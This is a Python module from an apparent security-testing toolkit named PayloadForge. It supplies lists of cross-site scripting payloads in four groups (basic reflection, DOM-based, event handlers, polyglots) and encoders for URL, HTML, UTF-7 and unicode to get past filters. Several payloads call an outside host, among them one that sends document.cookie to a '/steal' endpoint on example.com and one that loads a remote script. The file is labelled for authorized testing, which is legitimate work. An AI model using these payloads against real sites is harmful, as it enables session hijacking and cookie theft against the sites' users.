"""
PayloadForge XSS Payload Generator

⚠️  ETHICAL USE ONLY ⚠️

This module generates Cross-Site Scripting (XSS) payloads for authorized
security testing and educational purposes only. Never use these payloads
against systems without explicit written permission.

Payload Types:
- Basic Reflection XSS
- DOM-based XSS
- Event Handler XSS

Encoding Options:
- URL encoding
- HTML entities
- UTF-7
- Unicode bypass
"""

from typing import List, Optional
from payloadforge.logger import logger


class XSSGenerator:
    """
    XSS Payload Generator for ethical security testing.
    
    ⚠️ FOR AUTHORIZED TESTING ONLY ⚠️
    """
    
    # Basic reflection XSS payloads
    BASIC_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '<script>alert(document.cookie)</script>',
        '<script>alert(document.domain)</script>',
        "<script>alert('XSS')</script>",
        '<script>confirm("XSS")</script>',
        '<script>prompt("XSS")</script>',
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<script src="https://example.com/xss.js"></script>',
        '<script>new Image().src="https://example.com/steal?c="+document.cookie</script>',
        '<script>fetch("https://example.com/log?d="+document.domain)</script>',
    ]
    
    # DOM-based XSS payloads
    DOM_PAYLOADS = [
        '"><script>alert("XSS")</script>',
        "'-alert('XSS')-'",
        '";alert("XSS");//',
        '</script><script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')">',
        '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(\'XSS\')">click</maction></math>',
    ]
    
    # Event handler based payloads
    EVENT_HANDLER_PAYLOADS = [
        '<img src=x onerror="alert(\'XSS\')">',
        '<img src=x onError="alert(\'XSS\')">',
        '<svg/onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<marquee onstart=alert("XSS")>',
        '<video src=x onerror=alert("XSS")>',
        '<audio src=x onerror=alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        '<object data="javascript:alert(\'XSS\')">',
        '<embed src="javascript:alert(\'XSS\')">',
        '<a href="javascript:alert(\'XSS\')">Click me</a>',
        '<form action="javascript:alert(\'XSS\')"><input type=submit>',
        '<button onclick="alert(\'XSS\')">Click</button>',
        '<div onmouseover="alert(\'XSS\')">Hover me</div>',
    ]
    
    # Polyglot payloads (work in multiple contexts)
    POLYGLOT_PAYLOADS = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        '"><img src=x onerror=alert(1)//><',
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "\"'><script>alert(String.fromCharCode(88,83,83))</script>",
        "`><script>alert(String.fromCharCode(88,83,83))</script>",
    ]
    
    @classmethod
    def generate_basic(cls, count: Optional[int] = None) -> List[str]:
        """
        Generate basic reflection XSS payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of XSS payload strings.
        """
        logger.log_xss("basic")
        payloads = cls.BASIC_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_dom(cls, count: Optional[int] = None) -> List[str]:
        """
        Generate DOM-based XSS payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of DOM-based XSS payload strings.
        """
        logger.log_xss("dom")
        payloads = cls.DOM_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_event_handlers(cls, count: Optional[int] = None) -> List[str]:
        """
        Generate event handler based XSS payloads.
        
        Args:
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of event handler XSS payload strings.
        """
        logger.log_xss("event_handler")
        payloads = cls.EVENT_HANDLER_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_polyglot(cls, count: Optional[int] = None) -> List[str]:
        """
        Generate polyglot XSS payloads (work in multiple contexts).
        
        Args:
            count: Number of payloads to return. If None, returns all.
            
        Returns:
            List of polyglot XSS payload strings.
        """
        logger.log_xss("polyglot")
        payloads = cls.POLYGLOT_PAYLOADS
        return payloads[:count] if count else payloads
    
    @classmethod
    def generate_all(cls) -> dict:
        """
        Generate all XSS payloads categorized by type.
        
        Returns:
            Dictionary with payload categories as keys.
        """
        return {
            "basic": cls.generate_basic(),
            "dom": cls.generate_dom(),
            "event_handlers": cls.generate_event_handlers(),
            "polyglot": cls.generate_polyglot(),
        }
    
    @classmethod
    def with_encoding(cls, payloads: List[str], encoding: str) -> List[str]:
        """
        Apply encoding to payloads.
        
        Args:
            payloads: List of payloads to encode.
            encoding: Encoding type ('url', 'html', 'utf7', 'unicode').
            
        Returns:
            List of encoded payloads.
        """
        from payloadforge.encoders import url, html, unicode as unicode_enc
        
        logger.log_xss("encoded", encoding)
        
        encoded = []
        for payload in payloads:
            if encoding == "url":
                encoded.append(url.encode(payload))
            elif encoding == "html":
                encoded.append(html.encode(payload))
            elif encoding == "utf7":
                encoded.append(cls._encode_utf7(payload))
            elif encoding == "unicode":
                encoded.append(unicode_enc.encode_escape(payload))
            else:
                encoded.append(payload)
        
        return encoded
    
    @staticmethod
    def _encode_utf7(text: str) -> str:
        """Encode text to UTF-7 format."""
        try:
            return text.encode("utf-7").decode("ascii")
        except (UnicodeEncodeError, UnicodeDecodeError):
            return text


# Convenience functions
def generate_basic(count: Optional[int] = None) -> List[str]:
    """Generate basic XSS payloads."""
    return XSSGenerator.generate_basic(count)


def generate_dom(count: Optional[int] = None) -> List[str]:
    """Generate DOM-based XSS payloads."""
    return XSSGenerator.generate_dom(count)


def generate_event_handlers(count: Optional[int] = None) -> List[str]:
    """Generate event handler XSS payloads."""
    return XSSGenerator.generate_event_handlers(count)


def generate_all() -> dict:
    """Generate all XSS payloads."""
    return XSSGenerator.generate_all()
